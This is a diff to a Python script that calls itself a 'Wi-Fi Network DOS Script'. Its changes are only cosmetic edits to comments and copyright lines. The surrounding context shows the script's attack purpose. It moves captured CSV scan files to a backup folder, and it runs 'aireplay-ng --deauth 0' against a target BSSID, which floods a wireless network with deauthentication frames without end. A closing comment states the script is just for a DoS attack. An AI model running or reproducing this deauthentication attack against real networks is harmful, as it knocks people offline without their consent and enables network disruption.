@@ -1,4 +1,4 @@
-# Wi-Fi Network DOS Script. Copyright: CYBER NINJAS
+# Wi-Fi Network DOS Script. © Copyright: CYBER NINJAS
 # This script is written by ! Ninja </> only for the members of CYBER NINJAS (Non Distributeable!)
 # Contact me in case any issue.
 
@@ -58,15 +58,15 @@ for file_name in os.listdir():
         directory = os.getcwd()
 
         try:
-            #Making a new directory called /backup
+            # Making a new directory called /backup
             os.mkdir(directory + "/backup")
         
         except:
             print("Backup folder eixsts.")
         
-        #create timestamp
+        # create timestamp
         timestamp = datetime.now()
-        #Moving any .csv files in the folder to the backup folder
+        # Moving any .csv files in the folder to the backup folder
         shutil.move(file_name, directory + "/backup" + str(timestamp) + "-" + file_name)
 
 
@@ -196,4 +196,4 @@ subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_resu
 
 # This script ends here, THIS IS JUST FOR A DOS ATTACK, I WILL BE CREATING A NEW ONE SOON!
 
-# Copyright: CYBER NINJAS, ! Ninja </>
+# © Copyright: CYBER NINJAS, ! Ninja </>
